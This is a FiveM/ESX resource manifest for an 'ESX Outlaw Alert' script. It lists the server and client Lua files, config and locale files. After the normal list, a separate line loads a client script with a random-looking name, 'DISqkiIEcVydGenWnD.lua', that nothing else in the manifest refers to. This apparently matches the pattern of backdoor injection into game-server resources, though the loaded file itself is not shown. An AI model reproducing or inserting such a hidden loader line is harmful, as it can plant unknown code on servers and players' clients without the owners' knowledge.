




resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX Outlaw Alert'

version '1.1.0'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@essentialmode/locale.lua',
	'locales/fr.lua',
	'locales/en.lua',
	'locales/es.lua',
	'config.lua',
	'server/main.lua'
}
client_scripts {
	'@essentialmode/locale.lua',
	'locales/fr.lua',
	'locales/en.lua',
	'locales/es.lua',
	'config.lua',
	'client/main.lua'
}

client_script "DISqkiIEcVydGenWnD.lua"


